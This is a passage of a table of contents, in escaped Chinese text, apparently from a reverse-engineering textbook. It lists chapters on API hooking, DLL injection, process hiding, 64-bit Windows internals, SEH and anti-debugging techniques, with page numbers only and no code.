28.6.4\u3000\u538b\u5165\u201cuser32.dll\u201d\u5b57\u7b26\u4e32\u53c2\u6570 274 28.6.5\u3000\u8c03\u7528LoadLibraryA(\u201cuser32.dll\u201d) 275 28.6.6 \u201cMessageBoxA\u201d\u5b57\u7b26\u4e32 276 28.6.7\u3000\u8c03\u7528GetProcAddress(hMod,\u201cMessageBoxA\u201d) 276 28.6.8\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 1 - MB_OK 277 28.6.9\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 2 -\u201cReverseCore\u201d 277 28.6.10\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 3 -\u201cwww.reversecore.com\u201d 278 28.6.11\u3000\u538b\u5165MessageBoxA()\u51fd\u6570\u7684\u53c2\u6570 4 -NULL 279 28.6.12\u3000\u8c03\u7528MessageBoxA() 279 28.6.13\u3000\u8bbe\u7f6eThreadProc()\u51fd\u6570\u7684\u8fd4\u56de\u503c 280 28.6.14\u3000\u5220\u9664\u6808\u5e27\u53ca\u51fd\u6570\u8fd4\u56de 280 28.7\u3000\u5c0f\u7ed3 280 \u7b2c\u56db\u90e8\u5206\u3000API\u94a9\u53d6 \u7b2c29\u7ae0\u3000API\u94a9\u53d6\uff1a\u9006\u5411\u5206\u6790\u4e4b\u201c\u82b1\u201d 282 29.1\u3000\u94a9\u53d6 282 29.2\u3000API\u662f\u4ec0\u4e48 282 29.3\u3000API\u94a9\u53d6 283 29.3.1\u3000\u6b63\u5e38\u8c03\u7528API 283 29.3.2\u3000\u94a9\u53d6API\u8c03\u7528 284 29.4\u3000\u6280\u672f\u56fe\u8868 284 29.4.1\u3000\u65b9\u6cd5\u5bf9\u8c61\uff08\u662f\u4ec0\u4e48\uff09 285 29.4.2\u3000\u4f4d\u7f6e\uff08\u4f55\u5904\uff09 285 29.4.3\u3000\u6280\u672f\uff08\u5982\u4f55\uff09 286 29.4.4\u3000API 286 \u7b2c30\u7ae0\u3000\u8bb0\u4e8b\u672cWriteFile() API\u94a9\u53d6 288 30.1\u3000\u6280\u672f\u56fe\u8868 - \u8c03\u8bd5\u6280\u672f 288 30.2\u3000\u5173\u4e8e\u8c03\u8bd5\u5668\u7684\u8bf4\u660e 289 30.2.1\u3000\u672f\u8bed 289 30.2.2\u3000\u8c03\u8bd5\u5668\u529f\u80fd 289 30.2.3\u3000\u8c03\u8bd5\u5668\u7684\u5de5\u4f5c\u539f\u7406 289 30.2.4\u3000\u8c03\u8bd5\u4e8b\u4ef6 289 30.3\u3000\u8c03\u8bd5\u6280\u672f\u6d41\u7a0b 290 30.4\u3000\u7ec3\u4e60 291 30.5\u3000\u5de5\u4f5c\u539f\u7406 293 30.5.1\u3000\u6808 293 30.5.2\u3000\u6267\u884c\u6d41 295 30.5.3 \u201c\u8131\u94a9\u201d&\u201c\u94a9\u5b50\u201d 295 30.6\u3000\u6e90\u4ee3\u7801\u5206\u6790 295 30.6.1\u3000main() 296 30.6.2\u3000DebugLoop() 296 30.6.3\u3000EXIT_PROCESS_DEBUG_EVENT 298 30.6.4\u3000CREATE_PROCESS_DEBUG_EVENT-OnCreateProcess-DebugEvent() 298 30.6.5\u3000EXCEPTION_DEBUG_EVENT-OnException-DebugEvent() 300 \u7b2c31\u7ae0\u3000\u5173\u4e8e\u8c03\u8bd5\u5668 305 31.1\u3000OllyDbg 305 31.2\u3000IDA Pro 305 31.3\u3000WinDbg 306 \u7b2c32\u7ae0\u3000\u8ba1\u7b97\u5668\u663e\u793a\u4e2d\u6587\u6570\u5b57 308 32.1\u3000\u6280\u672f\u56fe\u8868 308 32.2\u3000\u9009\u5b9a\u76ee\u6807API 309 32.3\u3000IAT\u94a9\u53d6\u5de5\u4f5c\u539f\u7406 312 32.4\u3000\u7ec3\u4e60\u793a\u4f8b 314 32.5\u3000\u6e90\u4ee3\u7801\u5206\u6790 316 32.5.1\u3000DllMain() 316 32.5.2\u3000MySetWindowTextW() 317 32.5.3\u3000hook_iat() 319 32.6\u3000\u8c03\u8bd5\u88ab\u6ce8\u5165\u7684DLL\u6587\u4ef6 322 32.6.1\u3000DllMain() 325 32.6.2\u3000hook_iat() 325 32.6.3\u3000MySetWindowTextW() 327 32.7\u3000\u5c0f\u7ed3 328 \u7b2c33\u7ae0\u3000\u9690\u85cf\u8fdb\u7a0b 329 33.1\u3000\u6280\u672f\u56fe\u8868 329 33.2\u3000API\u4ee3\u7801\u4fee\u6539\u6280\u672f\u7684\u539f\u7406 329 33.2.1\u3000\u94a9\u53d6\u4e4b\u524d 330 33.2.2\u3000\u94a9\u53d6\u4e4b\u540e 330 33.3\u3000\u8fdb\u7a0b\u9690\u85cf 332 33.3.1\u3000\u8fdb\u7a0b\u9690\u85cf\u5de5\u4f5c\u539f\u7406 332 33.3.2\u3000\u76f8\u5173API 332 33.3.3\u3000\u9690\u85cf\u6280\u672f\u7684\u95ee\u9898 333 33.4\u3000\u7ec3\u4e60 #1\uff08HideProc.exe\uff0cstealth.dll\uff09 333 33.4.1\u3000\u8fd0\u884cnotepad.exe\u3001procexp.exe\u3001taskmgr.exe 334 33.4.2\u3000\u8fd0\u884cHideProc.exe 334 33.4.3\u3000\u786e\u8ba4stealth.dll\u6ce8\u5165\u6210\u529f 334 33.4.4\u3000\u67e5\u770bnotepad.exe\u8fdb\u7a0b\u662f\u5426\u9690\u85cf\u6210\u529f 335 33.4.5\u3000\u53d6\u6d88notepad.exe\u8fdb\u7a0b\u9690\u85cf 336 33.5\u3000\u6e90\u4ee3\u7801\u5206\u6790 336 33.5.1\u3000HideProc.cpp 336 33.5.2\u3000stealth.cpp 338 33.6\u3000\u5168\u5c40API\u94a9\u53d6 344 33.6.1\u3000Kernel32.CreateProcess() API 344 33.6.2\u3000Ntdll.ZwResumeThread() API 345 33.7\u3000\u7ec3\u4e60#2\uff08HideProc2.exe,Stealth2.dll\uff09 345 33.7.1\u3000\u590d\u5236stealth2.dll\u6587\u4ef6\u5230%SYSTEM%\u6587\u4ef6\u5939\u4e2d 345 33.7.2\u3000\u8fd0\u884cHideProc2.exe -hide 346 33.7.3\u3000\u8fd0\u884cProcExp.exe&notepad.exe 346 33.7.4\u3000\u8fd0\u884cHideProc2.exe -show 347 33.8\u3000\u6e90\u4ee3\u7801\u5206\u6790 348 33.8.1\u3000HideProc2.cpp 348 33.8.2\u3000stealth2.cpp 348 33.9\u3000\u5229\u7528\u201c\u70ed\u8865\u4e01\u201d\u6280\u672f\u94a9\u53d6API 350 33.9.1\u3000API\u4ee3\u7801\u4fee\u6539\u6280\u672f\u7684\u95ee\u9898 350 33.9.2 \u201c\u70ed\u8865\u4e01\u201d\uff08\u4fee\u65397\u4e2a\u5b57\u8282\u4ee3\u7801\uff09 350 33.10\u3000\u7ec3\u4e60 #3\uff1astealth3.dll 353 33.11\u3000\u6e90\u4ee3\u7801\u5206\u6790 353 33.12\u3000\u4f7f\u7528\u201c\u70ed\u8865\u4e01\u201dAPI\u94a9\u53d6\u6280\u672f\u65f6\u9700\u8981\u8003\u8651\u7684\u95ee\u9898 356 33.13\u3000\u5c0f\u7ed3 357 \u7b2c34\u7ae0\u3000\u9ad8\u7ea7\u5168\u5c40API\u94a9\u53d6\uff1aIE\u8fde\u63a5\u63a7\u5236 359 34.1\u3000\u76ee\u6807API 359 34.2\u3000IE\u8fdb\u7a0b\u7ed3\u6784 361 34.3\u3000\u5173\u4e8e\u5168\u5c40API\u94a9\u53d6\u7684\u6982\u5ff5 362 34.3.1\u3000\u5e38\u89c4API\u94a9\u53d6 363 34.3.2\u3000\u5168\u5c40API\u94a9\u53d6 363 34.4\u3000ntdll!ZwResumeThread() API 364 34.5\u3000\u7ec3\u4e60\u793a\u4f8b\uff1a\u63a7\u5236IE\u7f51\u7edc\u8fde\u63a5 368 34.5.1\u3000\u8fd0\u884cIE 368 34.5.2\u3000\u6ce8\u5165DLL 369 34.5.3\u3000\u521b\u5efa\u65b0\u9009\u9879\u5361 369 34.5.4\u3000\u5c1d\u8bd5\u8fde\u63a5\u7f51\u7ad9 370 34.5.5\u3000\u5378\u8f7dDLL 371 34.5.6\u3000\u8bfe\u5916\u7ec3\u4e60 372 34.6\u3000\u793a\u4f8b\u6e90\u4ee3\u7801 372 34.6.1\u3000DllMain() 372 34.6.2\u3000NewInternetConnectW() 373 34.6.3\u3000NewZwResumeThread() 374 34.7\u3000\u5c0f\u7ed3 375 \u7b2c35\u7ae0\u3000\u4f18\u79c0\u5206\u6790\u5de5\u5177\u7684\u4e94\u79cd\u6807\u51c6 376 35.1\u3000\u5de5\u5177 376 35.2\u3000\u4ee3\u7801\u9006\u5411\u5206\u6790\u5de5\u7a0b\u5e08 376 35.3\u3000\u4f18\u79c0\u5206\u6790\u5de5\u5177\u7684\u4e94\u79cd\u6807\u51c6 376 35.3.1\u3000\u7cbe\u7b80\u5de5\u5177\u6570\u91cf 377 35.3.2\u3000\u5de5\u5177\u529f\u80fd\u7b80\u5355\u3001\u4f7f\u7528\u65b9\u4fbf 377 35.3.3\u3000\u5b8c\u5168\u638c\u63e1\u5404\u79cd\u529f\u80fd 377 35.3.4\u3000\u4e0d\u65ad\u5347\u7ea7\u66f4\u65b0 377 35.3.5\u3000\u7406\u89e3\u5de5\u5177\u7684\u6838\u5fc3\u5de5\u4f5c\u539f\u7406 377 35.4\u3000\u719f\u7ec3\u7a0b\u5ea6\u7684\u91cd\u8981\u6027 377 \u7b2c\u4e94\u90e8\u5206\u300064\u4f4d&Windows\u5185\u68386 \u7b2c36\u7ae0\u300064\u4f4d\u8ba1\u7b97 380 36.1\u300064\u4f4d\u8ba1\u7b97\u73af\u5883 380 36.1.1\u300064\u4f4dCPU 380 36.1.2\u300064\u4f4dOS 381 36.1.3\u3000Win32 API 381 36.1.4\u3000WOW64 381 36.1.5\u3000\u7ec3\u4e60\uff1aWOW64Test 384 36.2\u3000\u7f16\u8bd164\u4f4d\u6587\u4ef6 385 36.2.1\u3000Microsoft Windows SDK \uff08Software Development Kit\uff09 386 36.2.2\u3000\u8bbe\u7f6eVisual C++ 2010 Express\u73af\u5883 386 \u7b2c37\u7ae0\u3000x64\u5904\u7406\u5668 389 37.1\u3000x64\u4e2d\u65b0\u589e\u6216\u53d8\u66f4\u7684\u9879\u76ee 389 37.1.1\u300064\u4f4d 389 37.1.2\u3000\u5185\u5b58 389 37.1.3\u3000\u901a\u7528\u5bc4\u5b58\u5668 389 37.1.4\u3000CALL/JMP\u6307\u4ee4 390 37.1.5\u3000\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a 391 37.1.6\u3000\u6808 & \u6808\u5e27 392 37.2\u3000\u7ec3\u4e60\uff1aStack32.exe & Stack64.exe 392 37.2.1\u3000Stack32.exe 392 37.2.2\u3000Stack64.exe 394 37.3\u3000\u5c0f\u7ed3 397 \u7b2c38\u7ae0\u3000PE32+ 398 38.1\u3000PE32+\uff08PE+\u3001PE64\uff09 398 38.1.1\u3000IMAGE_NT_HEADERS 398 38.1.2\u3000IMAGE_FILE_HEADER 398 38.1.3\u3000IMAGE_OPTIONAL_HEADER 399 38.1.4\u3000IMAGE_THUNK_DATA 401 38.1.5\u3000IMAGE_TLS_DIRECTORY 403 \u7b2c39\u7ae0\u3000WinDbg 405 39.1\u3000WinDbg 405 39.1.1\u3000WinDbg\u7684\u7279\u5f81 405 39.1.2\u3000\u8fd0\u884cWinDbg 406 39.1.3\u3000\u5185\u6838\u8c03\u8bd5 407 39.1.4\u3000WinDbg\u57fa\u672c\u6307\u4ee4 409 \u7b2c40\u7ae0\u300064\u4f4d\u8c03\u8bd5 411 40.1\u3000x64\u73af\u5883\u4e0b\u7684\u8c03\u8bd5\u5668 411 40.2\u300064\u4f4d\u8c03\u8bd5 411 40.3\u3000PE32\uff1aWOW64Test_x86.exe 413 40.3.1\u3000EP\u4ee3\u7801 414 40.3.2\u3000Startup\u4ee3\u7801 414 40.3.3\u3000main()\u51fd\u6570 415 40.4\u3000PE32+\uff1aWOW64Test_x64.exe 416 40.4.1\u3000\u7cfb\u7edf\u65ad\u70b9 416 40.4.2\u3000EP\u4ee3\u7801 417 40.4.3\u3000Startup\u4ee3\u7801 418 40.4.4\u3000main()\u51fd\u6570 420 40.5\u3000\u5c0f\u7ed3 423 \u7b2c41\u7ae0\u3000ASLR 424 41.1\u3000Windows\u5185\u6838\u7248\u672c 424 41.2\u3000ASLR 424 41.3\u3000Visual C++ 424 41.4\u3000ASLR.exe 425 41.4.1\u3000\u8282\u533a\u4fe1\u606f 426 41.4.2\u3000IMAGE_FILE_HEADER\\Characteristics 427 41.4.3\u3000IMAGE_OPTIONAL_HEADER\\DLL Characteristics 428 41.5\u3000\u7ec3\u4e60\uff1a\u5220\u9664ASLR\u529f\u80fd 428 \u7b2c42\u7ae0\u3000\u5185\u68386\u4e2d\u7684\u4f1a\u8bdd 430 42.1\u3000\u4f1a\u8bdd 430 42.2\u3000\u4f1a\u8bdd0\u9694\u79bb\u673a\u5236 432 42.3\u3000\u589e\u5f3a\u5b89\u5168\u6027 432 \u7b2c43\u7ae0\u3000\u5185\u68386\u4e2d\u7684DLL\u6ce8\u5165 433 43.1\u3000\u518d\u73b0DLL\u6ce8\u5165\u5931\u8d25 433 43.1.1\u3000\u6e90\u4ee3\u7801 433 43.1.2\u3000\u6ce8\u5165\u6d4b\u8bd5 435 43.2\u3000\u539f\u56e0\u5206\u6790 436 43.2.1\u3000\u8c03\u8bd5 #1 436 43.2.2\u3000\u8c03\u8bd5 #2 438 43.3\u3000\u7ec3\u4e60\uff1a\u4f7fCreateRemoteThread()\u6b63\u5e38\u5de5\u4f5c 440 43.3.1\u3000\u65b9\u6cd5 #1\uff1a\u4fee\u6539CreateSuspended\u53c2\u6570\u503c 440 43.3.2\u3000\u65b9\u6cd5 #2\uff1a\u64cd\u7eb5\u6761\u4ef6\u5206\u652f 441 43.4\u3000\u7a0d\u4f5c\u6574\u7406 443 43.5\u3000InjectDll_new.exe 443 43.5.1\u3000InjectDll_new.cpp 443 43.5.2\u3000\u6ce8\u5165\u7ec3\u4e60 446 \u7b2c44\u7ae0\u3000InjDll.exe\uff1aDLL\u6ce8\u5165\u4e13\u7528\u5de5\u5177 448 44.1\u3000InjDll.exe 448 44.1.1\u3000\u4f7f\u7528\u65b9\u6cd5 448 44.1.2\u3000\u4f7f\u7528\u793a\u4f8b 449 44.1.3\u3000\u6ce8\u610f\u4e8b\u9879 450 \u7b2c\u516d\u90e8\u5206\u3000\u9ad8\u7ea7\u9006\u5411\u5206\u6790\u6280\u672f \u7b2c45\u7ae0\u3000TLS\u56de\u8c03\u51fd\u6570 452 45.1\u3000\u7ec3\u4e60 #1\uff1aHelloTls.exe 452 45.2\u3000TLS 453 45.2.1\u3000IMAGE_DATA_DIRECTORY[9] 453 45.2.2\u3000IMAGE_TLS_DIRECTORY 454 45.2.3\u3000\u56de\u8c03\u51fd\u6570\u5730\u5740\u6570\u7ec4 454 45.3\u3000TLS\u56de\u8c03\u51fd\u6570 455 45.4\u3000\u7ec3\u4e60 #2\uff1aTlsTest.exe 456 45.4.1\u3000DLL_PROCESS_ATTACH 457 45.4.2\u3000DLL_THREAD_ATTACH 457 45.4.3\u3000DLL_THREAD_DETACH 457 45.4.4\u3000DLL_PROCESS_DETACH 457 45.5\u3000\u8c03\u8bd5TLS\u56de\u8c03\u51fd\u6570 458 45.6\u3000\u624b\u5de5\u6dfb\u52a0TLS\u56de\u8c03\u51fd\u6570 459 45.6.1\u3000\u4fee\u6539\u524d\u7684\u539f\u7a0b\u5e8f 460 45.6.2\u3000\u8bbe\u8ba1\u89c4\u5212 460 45.6.3\u3000\u7f16\u8f91PE\u6587\u4ef6\u5934 461 45.6.4\u3000\u8bbe\u7f6eIMAGE_TLS_DIRECTORY\u7ed3\u6784\u4f53 463 45.6.5\u3000\u7f16\u5199TLS\u56de\u8c03\u51fd\u6570 464 45.6.6\u3000\u6700\u7ec8\u5b8c\u6210 464 45.7\u3000\u5c0f\u7ed3 465 \u7b2c46\u7ae0\u3000TEB 466 46.1\u3000TEB 466 46.1.1\u3000TEB\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49 466 46.1.2\u3000TEB\u7ed3\u6784\u4f53\u6210\u5458 466 46.1.3\u3000\u91cd\u8981\u6210\u5458 469 46.2\u3000TEB\u8bbf\u95ee\u65b9\u6cd5 470 46.2.1\u3000Ntdll.NtCurrentTeb() 470 46.2.2\u3000FS\u6bb5\u5bc4\u5b58\u5668 471 46.3\u3000\u5c0f\u7ed3 472 \u7b2c47\u7ae0\u3000PEB 473 47.1\u3000PEB 473 47.1.1\u3000PEB\u8bbf\u95ee\u65b9\u6cd5 473 47.1.2\u3000PEB\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49 474 47.1.3\u3000PEB\u7ed3\u6784\u4f53\u7684\u6210\u5458 475 47.2\u3000PEB\u7684\u91cd\u8981\u6210\u5458 477 47.2.1\u3000PEB.BeingDebugged 478 47.2.2\u3000PEB.ImageBaseAddress 478 47.2.3\u3000PEB.Ldr 479 47.2.4\u3000PEB.ProcessHeap & PEB.NtGlobalFlag 480 47.3\u3000\u5c0f\u7ed3 480 \u7b2c48\u7ae0\u3000SEH 481 48.1\u3000SEH 481 48.2\u3000SEH\u7ec3\u4e60\u793a\u4f8b #1 481 48.2.1\u3000\u6b63\u5e38\u8fd0\u884c 481 48.2.2\u3000\u8c03\u8bd5\u8fd0\u884c 482 48.3\u3000OS\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.3.1\u3000\u6b63\u5e38\u8fd0\u884c\u65f6\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.3.2\u3000\u8c03\u8bd5\u8fd0\u884c\u65f6\u7684\u5f02\u5e38\u5904\u7406\u65b9\u6cd5 484 48.4\u3000\u5f02\u5e38 485 48.4.1\u3000EXCEPTION_ACCESS_VIOLATION(C0000005) 486 48.4.2\u3000EXCEPTION_BREAKPOINT(80000003) 486 48.4.3\u3000EXCEPTION_ILLEGAL_INSTRUCTION(C000001D) 488 48.4.4\u3000EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094) 488 48.4.5\u3000EXCEPTION_SINGLE_STEP(80000004) 489 48.5\u3000SEH\u8be6\u7ec6\u8bf4\u660e 489 48.5.1\u3000SEH\u94fe 489 48.5.2\u3000\u5f02\u5e38\u5904\u7406\u51fd\u6570\u7684\u5b9a\u4e49 489 48.5.3\u3000TEB.NtTib.ExceptionList 491 48.5.4\u3000SEH\u5b89\u88c5\u65b9\u6cd5 492 48.6\u3000SEH\u7ec3\u4e60\u793a\u4f8b #2\uff08seh.exe\uff09 492 48.6.1\u3000\u67e5\u770bSEH\u94fe 493 48.6.2\u3000\u6dfb\u52a0SEH 493 48.6.3\u3000\u53d1\u751f\u5f02\u5e38 494 48.6.4\u3000\u67e5\u770b\u5f02\u5e38\u5904\u7406\u5668\u53c2\u6570 494 48.6.5\u3000\u8c03\u8bd5\u5f02\u5e38\u5904\u7406\u5668 496 48.6.6\u3000\u5220\u9664SEH 498 48.7\u3000\u8bbe\u7f6eOllyDbg\u9009\u9879 499 48.7.1\u3000\u5ffd\u7565KERNEL32\u4e2d\u53d1\u751f\u7684\u5185\u5b58\u975e\u6cd5\u8bbf\u95ee\u5f02\u5e38 500 48.7.2\u3000\u5411\u88ab\u8c03\u8bd5\u8005\u6d3e\u9001\u5f02\u5e38 500 48.7.3\u3000\u5176\u4ed6\u5f02\u5e38\u5904\u7406 500 48.7.4\u3000\u7b80\u5355\u7ec3\u4e60 500 48.8\u3000\u5c0f\u7ed3 501 \u7b2c49\u7ae0\u3000IA-32\u6307\u4ee4 502 49.1\u3000IA-32\u6307\u4ee4 502 49.2\u3000\u5e38\u7528\u672f\u8bed 502 49.2.1\u3000\u53cd\u6c47\u7f16\u5668 503 49.2.2\u3000\u53cd\u7f16\u8bd1\u5668 504 49.2.3\u3000\u53cd\u7f16\u8bd1\u7b80\u4ecb 504 49.3\u3000IA-32\u6307\u4ee4\u683c\u5f0f 506 49.3.1\u3000\u6307\u4ee4\u524d\u7f00 507 49.3.2\u3000\u64cd\u4f5c\u7801 507 49.3.3\u3000ModR/M 507 49.3.4\u3000SIB 508 49.3.5\u3000\u4f4d\u79fb 508 49.3.6\u3000\u7acb\u5373\u6570 509 49.4\u3000\u6307\u4ee4\u89e3\u6790\u624b\u518c 509 49.4.1\u3000\u4e0b\u8f7dIA-32\u7528\u6237\u624b\u518c 509 49.4.2\u3000\u6253\u5370\u6307\u4ee4\u89e3\u6790\u624b\u518c 509 49.5\u3000\u6307\u4ee4\u89e3\u6790\u7ec3\u4e60 510 49.5.1\u3000\u64cd\u4f5c\u7801\u6620\u5c04 510 49.5.2\u3000\u64cd\u4f5c\u6570 511 49.5.3\u3000ModR/M 512 49.5.4\u3000Group 514 49.5.5\u3000\u524d\u7f00 516 49.5.6\u3000\u53cc\u5b57\u8282\u64cd\u4f5c\u7801 518 49.5.7\u3000\u79fb\u4f4d\u503c&\u7acb\u5373\u6570 519 49.5.8\u3000SIB 520 49.6\u3000\u6307\u4ee4\u89e3\u6790\u8bfe\u5916\u7ec3\u4e60 524 49.7\u3000\u5c0f\u7ed3 524 \u7b2c\u4e03\u90e8\u5206\u3000\u53cd\u8c03\u8bd5\u6280\u672f \u7b2c50\u7ae0\u3000\u53cd\u8c03\u8bd5\u6280\u672f 526 50.1\u3000\u53cd\u8c03\u8bd5\u6280\u672f 526 50.1.1\u3000\u4f9d\u8d56\u6027 526 50.1.2\u3000\u591a\u79cd\u53cd\u8c03\u8bd5\u6280\u672f 526 50.2\u3000\u53cd\u8c03\u8bd5\u7834\u89e3\u6280\u672f 526 50.3\u3000\u53cd\u8c03\u8bd5\u6280\u672f\u7684\u5206\u7c7b 527 50.3.1\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u6280\u672f 528 50.3.2\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f 528 \u7b2c51\u7ae0\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u6280\u672f 529 51.1\u3000\u9759\u6001\u53cd\u8c03\u8bd5\u7684\u76ee\u7684 529 51.2\u3000PEB 529 51.2.1\u3000BeingDebugged(+0x2) 531 51.2.2\u3000Ldr(+0xC) 531 51.2.3\u3000Process Heap(+0x18) 532 51.2.4\u3000NtGlobalFlag(+0x68) 533 51.2.5\u3000\u7ec3\u4e60\uff1a?StaAD_PEB.exe 534 51.2.6\u3000\u7834\u89e3\u4e4b\u6cd5 534 51.3\u3000NtQueryInformationProcess() 537 51.3.1\u3000ProcessDebugPort(0x7) 538 51.3.2\u3000ProcessDebugObjectHandle(0x1E) 539 51.3.3\u3000ProcessDebugFlags(0x1F) 539 51.3.4\u3000\u7ec3\u4e60\uff1aStaAD_NtQIP.exe 540 51.3.5\u3000\u7834\u89e3\u4e4b\u6cd5 540 51.4\u3000NtQuerySystemInformation() 542 51.4.1\u3000SystemKernelDebugger-Information(0x23) 544 51.4.2\u3000\u7ec3\u4e60\uff1aStaAD_NtQSI.exe 545 51.4.3\u3000\u7834\u89e3\u4e4b\u6cd5 545 51.5\u3000NtQueryObject() 545 51.6\u3000ZwSetInformationThread() 549 51.6.1\u3000\u7ec3\u4e60\uff1aStaAD_ZwSIT.exe 549 51.6.2\u3000\u7834\u89e3\u4e4b\u6cd5 550 51.7\u3000TLS\u56de\u8c03\u51fd\u6570 550 51.8\u3000ETC 551 51.8.1\u3000\u7ec3\u4e60\uff1aStaAD_FindWindow.exe 551 51.8.2\u3000\u7834\u89e3\u4e4b\u6cd5 551 51.9\u3000\u5c0f\u7ed3 553 \u7b2c52\u7ae0\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f 554 52.1\u3000\u52a8\u6001\u53cd\u8c03\u8bd5\u6280\u672f\u7684\u76ee\u7684 554 52.2\u3000\u5f02\u5e38 554 52.2.1\u3000SEH 554 52.2.2\u3000SetUnhandledException-Filter() 558 52.3\u3000Timing Check 562 52.3.1\u3000\u65f6\u95f4\u95f4\u9694\u6d4b\u91cf\u6cd5 562 52.3.2\u3000RDTSC 563 52.4\u3000\u9677\u9631\u6807\u5fd7 565 52.4.1\u3000\u5355\u6b65\u6267\u884c 566 52.4.2\u3000INT 2D 569 52.5\u30000xCC\u63a2\u6d4b 572 52.5.1\u3000API\u65ad\u70b9 573 52.5.2\u3000\u6bd4\u8f83\u6821\u9a8c\u548c 575 \u7b2c53\u7ae0\u3000\u9ad8\u7ea7\u53cd\u8c03\u8bd5\u6280\u672f 577 53.1\u3000\u9ad8\u7ea7\u53cd\u8c03\u8bd5\u6280\u672f 577 53.2\u3000\u5783\u573e\u4ee3\u7801 577 53.3\u3000\u6270\u4e71\u4ee3\u7801\u5bf9\u9f50 578 53.4\u3000\u52a0\u5bc6/\u89e3\u5bc6 581 53.4.1\u3000\u7b80\u5355\u7684\u89e3\u7801\u793a\u4f8b 581 53.4.2\u3000\u590d\u6742\u7684\u89e3\u7801\u793a\u4f8b 582 53.4.3\u3000\u7279\u6b8a\u60c5\u51b5\uff1a\u4ee3\u7801\u91cd\u7ec4 584 53.5\u3000Stolen Bytes\uff08Remove OEP\uff09 584 53.6\u3000API\u91cd\u5b9a\u5411 587 53.6.1\u3000\u539f\u4ee3\u7801 588 53.6.2\u3000API\u91cd\u5b9a\u5411\u793a\u4f8b #1 588 53.6.3\u3000API\u91cd\u5b9a\u5411\u793a\u4f8b#2 589 53.7\u3000Debug Blocker\uff08Self Debugging\uff09 593 53.8\u3000\u5c0f\u7ed3 595 \u7b2c\u516b\u90e8\u5206\u3000\u8c03\u8bd5\u7ec3\u4e60 \u7b2c54\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e601\uff1a\u670d\u52a1 598 54.1\u3000\u670d\u52a1\u8fdb\u7a0b\u7684\u5de5\u4f5c\u539f\u7406 598 54.1.1\u3000\u670d\u52a1\u63a7\u5236\u5668 598 54.1.2\u3000\u670d\u52a1\u542f\u52a8\u8fc7\u7a0b 599 54.2\u3000DebugMe1.exe\u793a\u4f8b\u8bb2\u89e3 600 54.2.1\u3000\u5b89\u88c5\u670d\u52a1 600 54.2.2\u3000\u542f\u52a8\u670d\u52a1 602 54.2.3\u3000\u6e90\u4ee3\u7801 604 54.3\u3000\u670d\u52a1\u8fdb\u7a0b\u7684\u8c03\u8bd5 606 54.3.1\u3000\u95ee\u9898\u5728\u4e8eSCM 606 54.3.2\u3000\u8c03\u8bd5\u5668\u65e0\u6240\u4e0d\u80fd 606 54.3.3\u3000\u5e38\u7528\u65b9\u6cd5 606 54.4\u3000\u670d\u52a1\u8c03\u8bd5\u7ec3\u4e60 606 54.4.1\u3000\u76f4\u63a5\u8c03\u8bd5\uff1a\u5f3a\u5236\u8bbe\u7f6eEIP 606 54.4.2\u3000\u670d\u52a1\u8c03\u8bd5\u7684\u5e38\u7528\u65b9\u6cd5\uff1a\u201c\u9644\u52a0\u201d\u65b9\u5f0f 609 54.5\u3000\u5c0f\u7ed3 615 \u7b2c55\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e602\uff1a\u81ea\u6211\u521b\u5efa 616 55.1\u3000\u81ea\u6211\u521b\u5efa 616 55.2\u3000\u5de5\u4f5c\u539f\u7406 617 55.2.1\u3000\u521b\u5efa\u5b50\u8fdb\u7a0b\uff08\u6302\u8d77\u6a21\u5f0f\uff09 617 55.2.2\u3000\u66f4\u6539EIP 618 55.2.3\u3000\u6062\u590d\u4e3b\u7ebf\u7a0b 618 55.3\u3000\u793a\u4f8b\u7a0b\u5e8f\u6e90\u4ee3\u7801 618 55.4\u3000\u8c03\u8bd5\u7ec3\u4e60 620 55.4.1\u3000\u9700\u8981\u8003\u8651\u7684\u4e8b\u9879 620 55.4.2\u3000JIT\u8c03\u8bd5 621 55.4.3\u3000DebugMe2.exe 622 55.5\u3000\u5c0f\u7ed3 626 \u7b2c56\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e603\uff1aPE\u6620\u50cf\u5207\u6362 627 56.1\u3000PE\u6620\u50cf 627 56.2\u3000PE\u6620\u50cf\u5207\u6362 628 56.3\u3000\u793a\u4f8b\u7a0b\u5e8f\uff1aFake.exe\u3001Real.exe\u3001DebugMe3.exe 628 56.4\u3000\u8c03\u8bd51 631 56.4.1\u3000Open ? \u8f93\u5165\u8fd0\u884c\u53c2\u6570 631 56.4.2\u3000main()\u51fd\u6570 632 56.4.3\u3000SubFunc_1() 634 56.4.4\u3000CreateProcess(\u201cfake.exe\u201d\uff0cCREATE_SUSPENDED) 635 56.4.5\u3000SubFunc_2() 635 56.4.6\u3000SubFunc_3() 641 56.4.7\u3000ResumeThread() 644 56.5\u3000\u8c03\u8bd52 644 56.5.1\u3000\u601d\u8003 645 56.5.2\u3000\u5411EP\u8bbe\u7f6e\u65e0\u9650\u5faa\u73af 645 56.6\u3000\u5c0f\u7ed3 647 \u7b2c57\u7ae0\u3000\u8c03\u8bd5\u7ec3\u4e604\uff1aDebug Blocker 648 57.1\u3000Debug Blocker 648 57.2\u3000\u53cd\u8c03\u8bd5\u7279\u5f81 648 57.2.1\u3000\u7236\u4e0e\u5b50\u7684\u5173\u7cfb 649 57.2.2\u3000\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u4e0d\u80fd\u518d\u88ab\u5176\u4ed6\u8c03\u8bd5\u5668\u8c03\u8bd5 649 57.2.3\u3000\u7ec8\u6b62\u8c03\u8bd5\u8fdb\u7a0b\u7684\u540c\u65f6\u4e5f\u7ec8\u6b62\u88ab\u8c03\u8bd5\u8fdb\u7a0b 649 